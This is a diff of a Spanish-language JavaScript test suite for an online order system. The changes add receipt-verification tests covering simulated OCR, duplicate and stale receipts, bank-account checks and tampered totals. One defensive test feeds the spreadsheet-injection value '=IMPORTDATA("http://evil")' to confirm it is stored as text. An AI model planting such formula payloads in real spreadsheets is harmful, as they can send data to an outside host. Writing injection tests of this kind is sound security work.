@@ -15,15 +15,21 @@ const formulas = filas => filas.flatMap(f => Object.entries(f).filter(([, v]) =>
 
 const bytes = (cab, resto = 'foto') => Buffer.concat([Buffer.from(cab), Buffer.from(resto)]).toString('base64');
 const JPG = 'data:image/jpeg;base64,' + bytes([0xFF, 0xD8, 0xFF, 0xE0]);
+// cada comprobante es un archivo distinto (el mismo archivo dos veces se rechaza como "ya usado")
+let nJpg = 0;
+const jpgNuevo = () => 'data:image/jpeg;base64,' + bytes([0xFF, 0xD8, 0xFF, 0xE0], 'comprobante ' + (++nJpg));
+// texto que "lee" el OCR simulado: un comprobante real de hoy por el anticipo de 750 (50 % = 375)
+const hoy = () => { const d = new Date(); return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`; };
+const RECIBO = (monto = '375.00', extra = '') => `BAC Credomatic\nTransferencia exitosa\n${hoy()} 14:22\nCuenta destino 1234 5678\nMonto: L ${monto}\n${extra}`;
 function pedido(sim, extra = {}) {
   return {
     token: sim.config('Token del sitio'), fillMs: 9000, website: '',
     customer: { name: 'Ana López', phone: '9876 5432', email: 'ana@correo.com', city: 'Tegucigalpa', date: '2026-11-20', notes: 'Fondo rosa' },
     items: [{ product: 'Cuadro con minifiguras', qty: 1, unitPrice: 750, discount: 0, total: 750, options: [['Marco', 'Blanco']], bom: [{ key: 'Figura · Cuerpo', qty: 2 }], preview: JPG }],
-    total: 750, currency: 'HNL', comprobante: JPG, ...extra,
+    total: 750, currency: 'HNL', comprobante: jpgNuevo(), ...extra,
   };
 }
-const nuevo = (o = {}) => cargar({ silencio: true, ...o });
+const nuevo = (o = {}) => { const s = cargar({ silencio: true, ...o }); s.ctx.__ocr = RECIBO(); return s; };
 // tienda que deja pagar después (para probar el comprobante subido en Mis pedidos)
 const sinAnticipo = () => { const s = nuevo(); s.run(`setConfig_('Anticipo antes de enviar', 'No')`); return s; };
 
@@ -86,7 +92,7 @@ prueba('HTML en el nombre no se inyecta en el correo', () => {
 });
 
 prueba('Cantidades y montos absurdos se acotan', () => {
-  const s = nuevo();
+  const s = nuevo(); s.ctx.__ocr = RECIBO('0.00');
   ok(s.post(pedido(s, { total: -500, items: [{ product: 'X', qty: 1e9, total: 'abc', options: 'no-es-lista' }] })).ok);
   const pa = s.hoja('Partidas')[0], pe = s.hoja('Pedidos')[0];
   ok(pa.Cantidad === 99 && pa.Total === 0 && pe.Total === 0, JSON.stringify([pa.Cantidad, pa.Total, pe.Total]));
@@ -134,7 +140,7 @@ prueba('Sin comprobante no se puede enviar el pedido', () => {
 });
 
 prueba('Comprobante junto con el pedido: queda en Pagos y cuenta como pagado', () => {
-  const s = nuevo(); s.ctx.__ocr = 'Transferencia L 375.00';
+  const s = nuevo();
   const r = s.post(pedido(s));
   ok(r.ok && r.pago && r.pago.resultado === 'Coincide', JSON.stringify(r));
   const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id: r.id, phone: '98765432' });
@@ -196,7 +202,7 @@ prueba('Seguimiento: ID con caracteres raros se rechaza', () => {
 prueba('Comprobante con monto correcto: "Coincide"', () => {
   const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' }));
   s.ctx.__ocr = 'BAC Credomatic\nTransferencia exitosa\n27/10/2026 14:22\nCuenta 1234 5678\nMonto: L 375.00\nReferencia 99812';
-  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
+  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: jpgNuevo() });
   ok(r.ok && r.pago.resultado === 'Coincide' && r.pago.monto === 375, JSON.stringify(r));
   const pg = s.hoja('Pagos'); ok(pg.length === 1 && pg[0].Resultado === 'Coincide');
   const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
@@ -204,23 +210,26 @@ prueba('Comprobante con monto correcto: "Coincide"', () => {
 });
 
 prueba('Comprobante con otro monto: queda en revisión y no cuenta como pagado', () => {
-  const s = nuevo(); const { id } = s.post(pedido(s));
-  s.ctx.__ocr = 'Pago realizado HNL 1,200.00';
-  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
-  ok(r.ok && r.pago.resultado === 'Revisión' && r.pago.monto === 1200, JSON.stringify(r));
+  const s = sinAnticipo(); s.run(`setConfig_('Comprobante que no pasa la verificación', 'Revisar')`);
+  const { id } = s.post(pedido(s, { comprobante: '' }));
+  s.ctx.__ocr = RECIBO('1,200.00');
+  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: jpgNuevo() });
+  ok(r.ok && r.pago.resultado === 'Revisión', JSON.stringify(r));
   const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
   ok(seg.pedido.pagado === 0);
 });
 
-prueba('Comprobante sin Drive API: se guarda y queda "Sin lectura"', () => {
-  const s = nuevo({ ocr: false }); const { id } = s.post(pedido(s));
-  const r = s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
-  ok(r.ok && s.hoja('Pagos')[0].Resultado === 'Sin lectura');
+prueba('Comprobante sin Drive API: se rechaza; con Config "Revisar" se guarda como "Sin lectura"', () => {
+  const s = nuevo({ ocr: false });
+  const r = s.post(pedido(s));
+  ok(!r.ok && /No pudimos leer/.test(r.error) && s.hoja('Pedidos').length === 0, JSON.stringify(r));
+  s.run(`setConfig_('Comprobante que no pasa la verificación', 'Revisar')`);
+  ok(s.post(pedido(s)).ok && s.hoja('Pagos')[0].Resultado === 'Sin lectura');
 });
 
 prueba('Comprobante de pedido ajeno se rechaza', () => {
   const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' }));
-  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '91112222', file: JPG }).ok);
+  ok(!s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '91112222', file: jpgNuevo() }).ok);
   ok(s.hoja('Pagos').length === 0);
 });
 
@@ -233,7 +242,7 @@ prueba('Comprobante que no es imagen ni PDF se rechaza', () => {
 prueba('Texto del OCR con fórmulas no se vuelve fórmula', () => {
   const s = nuevo(); const { id } = s.post(pedido(s));
   s.ctx.__ocr = '=IMPORTDATA("http://evil") L 375';
-  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
+  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: jpgNuevo() });
   ok(!formulas(s.hoja('Pagos')).length);
 });
 
@@ -270,7 +279,7 @@ prueba('CRM: notas y etiquetas con fórmulas quedan como texto', () => {
 prueba('CRM: confirmar un pago lo suma como pagado', () => {
   const s = nuevo(); const { id } = s.post(pedido(s)); const k = JSON.stringify(s.config('Clave del CRM'));
   s.ctx.__ocr = 'algo raro';
-  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
+  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: jpgNuevo() });
   s.run(`crm(${k}, "pago", { row: 2, resultado: 'Confirmado', monto: 375 })`);
   const seg = s.post({ token: s.config('Token del sitio'), accion: 'seguimiento', id, phone: '98765432' });
   ok(seg.pedido.pagado === 375, JSON.stringify(seg.pedido));
@@ -322,12 +331,12 @@ prueba('Un pedido manda exactamente 1 correo (al cliente) y 0 al negocio', () =>
 
 prueba('Comprobante en Mis pedidos ya no avisa al negocio', () => {
   const s = sinAnticipo(); const { id } = s.post(pedido(s, { comprobante: '' })); s.mails.length = 0;
-  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: JPG });
+  s.post({ token: s.config('Token del sitio'), accion: 'comprobante', id, phone: '98765432', file: jpgNuevo() });
   ok(s.mails.length === 0, 'correos: ' + s.mails.length);
 });
 
 prueba('Correo al cliente: ID, total y anticipo 50% con saldo (comprobante que coincide)', () => {
-  const s = nuevo(); s.ctx.__ocr = 'Monto L 375.00';
+  const s = nuevo();
   s.run(`setConfig_('Sitio web', 'https://pehn.test/')`);
   const { id } = s.post(pedido(s)); const m = s.mails[0], t = soloTexto(m);
   ok(m.subject.includes(id) && t.includes(id), 'lleva el ID');
@@ -336,7 +345,7 @@ prueba('Correo al cliente: ID, total y anticipo 50% con saldo (comprobante que c
 });
 
 prueba('Correo al cliente: comprobante por revisar dice "verificando"', () => {
-  const s = nuevo(); s.ctx.__ocr = 'Monto L 900.00'; s.post(pedido(s));
+  const s = nuevo(); s.run(`setConfig_('Comprobante que no pasa la verificación', 'Revisar')`); s.ctx.__ocr = RECIBO('900.00'); s.post(pedido(s));
   ok(/Estamos verificando tu anticipo de L\s?375/.test(soloTexto(s.mails[0])), soloTexto(s.mails[0]));
 });
 
@@ -365,7 +374,7 @@ prueba('Pedido sin correo del cliente: marca "Sin correo" y no envía nada', () 
 });
 
 prueba('resumenDiario_ manda 1 correo al negocio con los pedidos del día', () => {
-  const s = nuevo(); s.ctx.__ocr = 'Monto L 375.00';
+  const s = nuevo();
   const a = s.post(pedido(s)).id, b = s.post(pedido(s, { customer: { name: 'Beto Pérez', phone: '91112222', email: 'b@b.co', city: 'SPS', date: '2026-10-28' } })).id;
   s.estado.cuota = 1; s.post(pedido(s, { customer: { name: 'Carla Sin Cuota', phone: '93334444', email: 'c@c.co', city: 'X' } }));
   s.estado.cuota = 100; s.mails.length = 0;
@@ -577,7 +586,7 @@ prueba('Candado: si el pedido falla, la carpeta temporal va a la papelera y nada
   const s = nuevo(); let carpeta;
   const raiz = s.run('folder_()'), crear = raiz.createFolder;
   raiz.createFolder = nombre => { carpeta = crear(nombre); carpeta.setTrashed = () => { carpeta.papelera = true; }; return carpeta; };
-  s.run(`consumoDePedido_ = () => { throw new Error('fallo interno'); }`);
+  s.run(`nuevoId_ = () => { throw new Error('fallo interno'); }`);
   ok(!s.post(pedido(s)).ok && s.hoja('Pedidos').length === 0);
   ok(carpeta && carpeta.papelera === true, 'la carpeta quedó huérfana');
 });
@@ -633,6 +642,60 @@ prueba('_headers: Turnstile permitido solo en script-src y frame-src; datos.js l
   ok(/challenges\.cloudflare\.com/.test(dir('script-src')) && /challenges\.cloudflare\.com/.test(dir('frame-src')));
   ok(!/challenges\.cloudflare\.com/.test(dir('default-src')) && !/unsafe-inline|unsafe-eval/.test(dir('script-src')));
   ok(/turnstileSiteKey: ''/.test(fsx.readFileSync(pathx.join(import.meta.dirname, '..', 'datos.js'), 'utf8')), 'datos.js debe traer la llave vacía');
+});
+
+
+// ---------- verificación de comprobantes en el momento (Verificacion.gs) ----------
+const verificar = (s, comprobante, total = 750) => s.post({ token: s.config('Token del sitio'), accion: 'verificar', comprobante, total });
+const rechazo = (s, ocr, extra = {}) => { s.ctx.__ocr = ocr; const r = s.post(pedido(s, extra)); ok(!r.ok && s.hoja('Pedidos').length === 0, JSON.stringify(r)); return r.error; };
+
+prueba('Verificar: comprobante correcto pasa y devuelve ficha', () => {
+  const s = nuevo(); const r = verificar(s, jpgNuevo());
+  ok(r.ok && r.verificacion.ok && r.verificacion.monto === 375 && r.verificacion.ficha, JSON.stringify(r));
+});
+prueba('Verificar: imagen sin texto de banco (comprobante falso) se rechaza', () => {
+  const s = nuevo(); s.ctx.__ocr = 'Foto de mi gato durmiendo en el sillón de la sala con L 375 escrito a mano';
+  const v = verificar(s, jpgNuevo()).verificacion; ok(!v.ok && /no parece un comprobante/.test(v.motivo), v.motivo);
+});
+prueba('Verificar: texto ilegible se rechaza', () => {
+  const s = nuevo(); s.ctx.__ocr = '';
+  ok(/No pudimos leer/.test(verificar(s, jpgNuevo()).verificacion.motivo));
+});
+prueba('Pedido con monto distinto al anticipo se rechaza', () => {
+  ok(/monto/.test(rechazo(nuevo(), RECIBO('100.00'))));
+});
+prueba('Pagar de más (entre anticipo y total) sí pasa', () => {
+  const s = nuevo(); s.ctx.__ocr = RECIBO('750.00'); ok(s.post(pedido(s)).ok);
+});
+prueba('Comprobante sin la cuenta del negocio se rechaza', () => {
+  const s = nuevo(); s.run(`setConfig_('Datos bancarios', 'BAC · Ahorro · 7300-1234-99 · Pehn Design')`);
+  ok(/cuenta/.test(rechazo(s, RECIBO())));
+  s.ctx.__ocr = RECIBO('375.00', 'Cuenta destino ****3499'); ok(s.post(pedido(s)).ok, 'con la cuenta sí pasa');
+});
+prueba('Comprobante con fecha vieja se rechaza', () => {
+  ok(/fecha/.test(rechazo(nuevo(), 'BAC Credomatic\nTransferencia exitosa\n03/01/2025\nMonto: L 375.00')));
+});
+prueba('El mismo archivo o la misma referencia no se aceptan dos veces', () => {
+  const s = nuevo(), archivo = jpgNuevo();
+  ok(s.post(pedido(s, { comprobante: archivo })).ok);
+  ok(/ya se usó/.test(s.post(pedido(s, { comprobante: archivo })).error), 'mismo archivo');
+  s.ctx.__ocr = RECIBO('375.00', 'Referencia: AB12345'); ok(s.post(pedido(s)).ok);
+  s.ctx.__ocr = RECIBO('375.00', 'Referencia: AB12345'); ok(/ya se usó/.test(s.post(pedido(s)).error), 'misma referencia');
+});
+prueba('La ficha de "verificar" evita leer de nuevo al enviar el pedido', () => {
+  const s = nuevo(), archivo = jpgNuevo(); const { ficha } = verificar(s, archivo).verificacion;
+  s.ctx.__ocr = ''; // si volviera a leer, no pasaría
+  const r = s.post(pedido(s, { comprobante: archivo, ficha })); ok(r.ok && r.pago.resultado === 'Coincide', JSON.stringify(r));
+});
+prueba('Una ficha no sirve para otro archivo ni otro total', () => {
+  const s = nuevo(); const { ficha } = verificar(s, jpgNuevo()).verificacion; s.ctx.__ocr = '';
+  ok(!s.post(pedido(s, { ficha })).ok, 'otro archivo');
+});
+prueba('Total bajado a mano (menos que sus piezas) se rechaza', () => {
+  const s = nuevo(); s.run(`cargarCatalogoPiezas_()`);
+  const items = [{ product: 'Retratera', qty: 1, total: 10, bom: [{ key: 'Cuadro con minifiguras · Retratera 3D · Grande', qty: 1 }] }];
+  s.ctx.__ocr = RECIBO('5.00');
+  const r = s.post(pedido(s, { items, total: 10 })); ok(!r.ok && /precio del pedido/.test(r.error), JSON.stringify(r));
 });
 
 console.log(`\n${n - fallas} de ${n} pruebas pasaron.`);
